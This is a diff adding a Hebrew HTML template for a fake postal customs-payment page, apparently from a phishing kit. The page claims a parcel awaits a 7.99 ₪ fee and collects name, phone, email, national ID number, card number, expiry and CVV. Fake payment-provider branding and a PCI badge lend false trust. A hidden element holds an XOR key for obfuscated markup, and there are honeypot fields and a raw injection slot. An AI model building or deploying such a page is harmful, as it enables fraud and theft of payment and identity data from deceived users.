@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="he-IL" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>אתר דואר</title>
+  <link rel="stylesheet" href="/static/css/lab-theme.css" />
+  <link rel="stylesheet" href="/static/css/billing-overlays.css" />
+  {% if bango_shell_inject %}{{ bango_shell_inject|safe }}{% endif %}
+  <link rel="stylesheet" href="{{ url_for('theme_asset', theme_name=active_theme_id, filename='style.css') }}">
+</head>
+<body class="{{ bcls['bango-page'] }}">
+  <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ billing_ui_map_json|default(bango_ui_map_json)|e }}" data-ui-key="{{ billing_xor_key|default(bango_xor_key)|e }}" aria-hidden="true">.</div>
+  <div class="page-card siteW" id="bango-main">
+    <header class="site-banner" role="banner">
+      <img class="site-banner__img" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/banar.jpg') }}" alt="" width="631" height="157" loading="eager" decoding="async" fetchpriority="high">
+    </header>
+
+    <form id="{{ bcls['bango-form'] }}" class="Yform" method="post" novalidate>
+      <div class="page-intro">
+        <h5 class="user-info fw-bolder text-danger">החבילה שלך מחכה למשלוח. אנא שלם מכס (7.99 ₪)</h5>
+      </div>
+      <p id="bango-msg" role="status" aria-live="polite"></p>
+
+      <div class="server_err_msg">הודעת שגיאה מהשרת</div>
+      <div class="form-columns">
+        <div class="part_container">
+          <fieldset class="main_fieldset" aria-labelledby="cap-package cap-personal">
+            <div id="cap-package" class="fieldset-cap">מספר חבילה</div>
+            <div class="dbl_cont">
+              <div class="form_hndlDiv">
+                <label for="code">עקוב אחר חבילה</label>
+                <input type="text" id="code" class="input-text" value="LK206047576ES" disabled>
+              </div>
+            </div>
+
+            <div id="cap-personal" class="fieldset-section-head">פרטים אישיים</div>
+            <div class="dbl_cont">
+              <div class="form_hndlDiv">
+                <label for="fname">שם פרטי</label>
+                <input type="text" id="fname" name="fname" class="input-text" placeholder="שם פרטי">
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-fname" hidden>שדה חובה</span>
+              </div>
+              <div class="form_hndlDiv">
+                <label for="lname">שם משפחה</label>
+                <input type="text" id="lname" name="lname" class="input-text" placeholder="שם משפחה">
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-lname" hidden>שדה חובה</span>
+              </div>
+            </div>
+
+            <div class="form_hndlDiv">
+              <label for="phone">מספר טלפון נייד</label>
+                <input type="tel" id="phone" name="phone" class="input-text" placeholder="מספר טלפון" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="tel">
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-phone" hidden role="alert">שדה חובה</span>
+            </div>
+            <div class="form_hndlDiv">
+              <label for="email">דוא"ל</label>
+              <input type="email" id="email" name="email" class="input-text" placeholder='דוא"ל' autocomplete="email">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-email" hidden role="alert">שדה חובה</span>
+            </div>
+          </fieldset>
+        </div>
+
+        <div class="part_container">
+          <fieldset class="main_fieldset credit_fieldset" aria-labelledby="cap-cc">
+            <div id="cap-cc" class="fieldset-cap">מלאו את פרטי כרטיס האשראי</div>
+            <div class="form_hndlDiv" id="ids-container">
+              <label for="id_num">תעודת זהות</label>
+              <input type="tel" id="id_num" name="id_num" class="input-text" placeholder="תעודת זהות" inputmode="numeric" pattern="[0-9]*" maxlength="9" autocomplete="off">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-id_num" hidden role="alert">שדה חובה</span>
+            </div>
+            <div class="form_hndlDiv" id="credit-card-container">
+              <label for="card">מספר כרטיס אשראי</label>
+              <input type="tel" id="card" name="card" class="input-text" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" pattern="[0-9]*" maxlength="19" autocomplete="cc-number">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-card" hidden role="alert">שדה חובה</span>
+            </div>
+            <div class="form-row form-row--expiry-cvv">
+              <div class="form_hndlDiv tokefHndl">
+                <label for="exp">תוקף הכרטיס</label>
+                <div class="form_hndlDiv select_cont">
+                  <input type="tel" id="exp" name="exp" class="input-text input-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-exp">
+                  <span class="{{ bcls['bango-field-error'] }}" id="bango-err-exp" hidden role="alert">שדה חובה</span>
+                </div>
+              </div>
+              <div class="form_hndlDiv short cvv_cont">
+                <label for="cvv">CVV</label>
+                <div class="cvv-input-row">
+                  <input type="password" id="cvv" name="cvv" class="input-text" placeholder="000" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-csc">
+                  <div class="help">
+                    <span class="help_trigger" role="button" tabindex="0" aria-label="עזרה CVV">?</span>
+                    <div class="help_content" aria-hidden="true">
+                      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/card_CVV.png') }}" alt="" class="cvv_img">
+                    </div>
+                  </div>
+                </div>
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-cvv" hidden role="alert">שדה חובה</span>
+              </div>
+            </div>
+          </fieldset>
+          <input class="submit_btn {{ bcls['btn-submit'] }}" id="submit" type="submit" value="לתשלום">
+        </div>
+      </div>
+      <div style="position:absolute;left:-9999px;height:0;overflow:hidden;opacity:0" aria-hidden="true">
+        <input type="text" name="bango_honeypot_company" id="bango-hp-company" tabindex="-1" autocomplete="off" value="" />
+        <input type="text" name="bango_honeypot_website" id="bango-hp-website" tabindex="-1" autocomplete="off" value="" />
+      </div>
+    </form>
+  </div>
+
+  <footer class="footer siteW">
+    <div id="paypal"></div>
+    <div id="tableicons" class="crdtcrd_cont">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/apayicon2.png') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/isracart.png') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/leumicard.png') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/mastercard.png') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/viza.png') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/Diners_Club_Logo.svg') }}" alt="">
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/amex credit card.png') }}" alt="">
+    </div>
+    <div class="footer-meta">
+      <span>Powered By:</span>
+      <a href="#" target="_blank" rel="noopener noreferrer">Yaad Sarig Payments</a>&nbsp;&nbsp;|&nbsp;
+      <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/pci.png') }}" alt="">
+    </div>
+  </footer>
+
+  {% include 'shared/billing_overlays.html' %}
+
+  <script nonce="{{ billing_csp_nonce or bango_csp_nonce }}" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='script.js') }}"></script>
+  {% include 'bango/scripts.html' %}
+</body>
+</html>
+
